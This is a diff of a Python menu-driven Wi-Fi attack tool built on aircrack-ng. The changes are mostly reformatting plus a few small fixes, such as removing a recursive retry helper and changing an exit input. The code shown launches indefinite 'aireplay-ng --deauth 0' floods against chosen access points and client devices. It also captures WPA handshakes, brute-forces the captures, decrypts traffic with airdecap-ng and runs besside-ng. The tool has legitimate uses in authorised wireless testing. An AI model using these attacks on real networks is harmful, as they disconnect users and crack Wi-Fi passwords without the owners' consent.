@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-import csv
 import os
 import re
 import time
@@ -27,7 +26,6 @@ terminal_positions = [(0, 0), (0, 400), (0, 800), (800, 0), (800, 400),
                       (800, 800)]  # top-right, middle-right, bottom-right, top-left, middle-left, bottom-left
 
 
-#### methods for other methods
 def check_for_q_press(interval=0.1, timeout=3):
     start_time = time.time()
     while time.time() - start_time < timeout:
@@ -35,6 +33,7 @@ def check_for_q_press(interval=0.1, timeout=3):
             return True
         time.sleep(interval)
     return False
+
 
 def get_screen_resolution():
     output = check_command_output("xdpyinfo | grep dimensions")
@@ -105,12 +104,11 @@ def popen_command(command, killtime=0):
     process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
     if killtime:
-        # print(yellow(f'if process does not finish in {killtime} seconds, press enter to kill it'))
         time.sleep(killtime)
         os.killpg(process.pid, signal.SIGTERM)
         process.wait()
         output, error = process.communicate()
-        output = output.decode('latin1')  # sometimes airodump output causes issues with utf-8
+        output = output.decode('latin1')
         error = error.decode('latin1')
         return output, error
     else:
@@ -244,13 +242,16 @@ def scan_for_networks():
         ssid_counter = 0
         for row in output.split('\n'):
             column = row.split()
-            if len(column) >= 12 and str(column[0]) != '' and str(column[5]) != '' and str(column[-3]) != ''   and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(
-                    column[10]) == '][' and not str(
-                    column[10]).startswith('<length:') and not str(column[10]).startswith('0>:') and not str(column[10]).startswith('0>') and not str(column[10]).startswith('SAE') and not str(column[10]).startswith('(not associated)'):
+            if len(column) >= 12 and str(column[0]) != '' and str(column[5]) != '' and str(
+                    column[-3]) != '' and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(
+                column[10]) == '][' and not str(
+                column[10]).startswith('<length:') and not str(column[10]).startswith('0>:') and not str(
+                column[10]).startswith('0>') and not str(column[10]).startswith('SAE') and not str(
+                column[10]).startswith('(not associated)'):
                 if column[10] not in [ssid[1] for ssid in found_SSIDS]:
                     ssid_counter += 1
                     found_SSIDS.append([ssid_counter, column[10]])
-                    ssid_map[ssid_counter] = [column[10],column[0],column[0][:8],column[5],column[-3]]
+                    ssid_map[ssid_counter] = [column[10], column[0], column[0][:8], column[5], column[-3]]
     else:
         print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
         print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
@@ -264,9 +265,11 @@ def deauthentication(timeout=0):
         else:
             return
     if not timeout:
-        popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
+        popen_command_new_terminal(
+            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
     if timeout:
-        aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
+        aireplay = popen_command_new_terminal(
+            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
 
         while timeout != 0:
             print(
@@ -281,6 +284,8 @@ def deauthentication(timeout=0):
             aireplay.wait()
         except ProcessLookupError:
             return
+
+
 def device_deauthentication(timeout=0):
     if not target_device:
         print(f'Select a {yellow("target Device")} to continue with this attack')
@@ -290,7 +295,8 @@ def device_deauthentication(timeout=0):
         #     return
     switch_interface_channel()
     if not timeout:
-        popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} --ignore-negative-one {selected_interface}')
+        popen_command_new_terminal(
+            f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} --ignore-negative-one {selected_interface}')
     elif timeout:
         aireplay = popen_command_new_terminal(
             f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} --ignore-negative-one {selected_interface}')
@@ -306,6 +312,8 @@ def device_deauthentication(timeout=0):
             aireplay.wait()
         except ProcessLookupError:
             return
+
+
 def change_interface():
     global selected_interface
     print("Available Network Interfaces: \n")
@@ -328,6 +336,7 @@ def change_interface():
                 break
             elif int(selection) > interface_count:
                 print(f'Selected interface ({selection}) {red("does not exist")}')
+
 
 def select_target_ap():
     clear()
@@ -363,7 +372,7 @@ def select_target_oui():
     if not ssid_map:
         scan_for_networks()
     grouped_by_oui = {}
-    for key,value in ssid_map.items():
+    for key, value in ssid_map.items():
         oui = value[2]
         if oui not in grouped_by_oui:
             grouped_by_oui[oui] = [value[0]]
@@ -372,7 +381,9 @@ def select_target_oui():
     numbered_oui = {i + 1: oui for i, oui in enumerate(grouped_by_oui.keys())}
     for key, value in numbered_oui.items():
         print(f"{cyan(key)})  {yellow('OUI')}: {value} \n"
-              f"    {blue('SSIDs')}:", f"{grouped_by_oui[value]}".replace('[','').replace(']','').replace('\'','').replace(',',f'f{green(" && ")}'))
+              f"    {blue('SSIDs')}:",
+              f"{grouped_by_oui[value]}".replace('[', '').replace(']', '').replace('\'', '').replace(',',
+                                                                                                     f'f{green(" && ")}'))
     while True:
         selection = input(
             f"\nEnter the number of the {green('OUI')} of the target AP / {green('( exit to return)')} : ")
@@ -384,6 +395,7 @@ def select_target_oui():
             break
         else:
             print(f'Invalid selection {red(selection)}')
+
 
 def select_target_device():
     global device_list_of_target_ap
@@ -428,6 +440,8 @@ def select_target_device():
     else:
         input(f'No Device is connected to {green(target_bssid)} Press enter to return : ')
         return
+
+
 def deauth_devices_in_target_ap():
     global target_device
     clear()
@@ -551,6 +565,7 @@ def deauth_by_oui():
                     target_bssid = store_target_bssid
                     return
 
+
 def remove_files_with_prefix(directory, prefix):
     pattern = os.path.join(directory, prefix + '*')
 
@@ -615,17 +630,10 @@ def capture_packets():
         print(f'{red("AIRODUMP-NG STDERR ::")}\n{red(str(error))}')
         input(f'Press enter to return :  ')
         return
+
+
 def capture_handshake():
     clear()
-
-    def recursion():
-        selection = input('\nDo you want to try again Y/N : ').lower()
-        while 1:
-            if selection == 'y':
-                capture_handshake()
-            elif selection == 'n':
-                return
-        return
 
     if not target_ap:
         print(f'Select a {yellow("target AP")} to continue with this attack')
@@ -656,6 +664,7 @@ def capture_handshake():
             print(f"Remaining time {green(timeout)} Press Q to cancel")
             if check_for_q_press(timeout=1):
                 print("Loop canceled by user.")
+                time.sleep(1)
                 break
             timeout -= 1
         os.killpg(airodump.pid, signal.SIGTERM)
@@ -693,8 +702,8 @@ def capture_handshake():
                 remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture',
                                          f'{target_ap}')
                 os.rmdir(f'/tmp/{target_ap}-handshakeCapture')
-                recursion()
-                return
+                input(
+                    f' press enter to return to network attacks menu and select {green("C2")} to capture the handshake for {green(target_ap)}')
         except ProcessLookupError:
             print('airodump killed unexpectedly', ProcessLookupError)
     else:
@@ -731,7 +740,7 @@ def airdecap_wpa():
             return
     clear()
     print(f'Running decryption on {green(capture_location)} with airdecap \n')
-    output,error = popen_command(f'airdecap-ng -e {target_ap} -p {password_of_ap} {capture_location}')
+    output, error = popen_command(f'airdecap-ng -e {target_ap} -p {password_of_ap} {capture_location}')
     if 'Could not open' in output:
         print(f'{red("STDOUT")}  = {output}')
         print(f'{red("STDERR")}  = {error}')
@@ -793,7 +802,7 @@ def bruteforce_handshake_capture():
                 f'Or type {red("N")} to return to Network attacks menu '
                 f'(type C1 in Network attacks to capture the handshake for {green(target_ap)})')
             capture_file_address = input('address/N : ')
-            if capture_file_address == '999':
+            if capture_file_address == 'N' or capture_file_address == 'n':
                 return
             print(f"selected capture file address is : {green(capture_file_address)} ")
             selection = input("Type Y to continue Y/N : ").lower()
@@ -892,6 +901,7 @@ def besside():
             input('input anything to return to network attacks menu : ')
             return
 
+
 def besside_target_ap():
     if not target_ap:
         print(f'Select a {yellow("target AP")} to continue : ')
@@ -963,6 +973,7 @@ def graph_networks():
     airgraph.wait()
     input(f'output saved in {graph_output_location} press enter to continue')
     return
+
 
 old_art = [
     "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀ ",
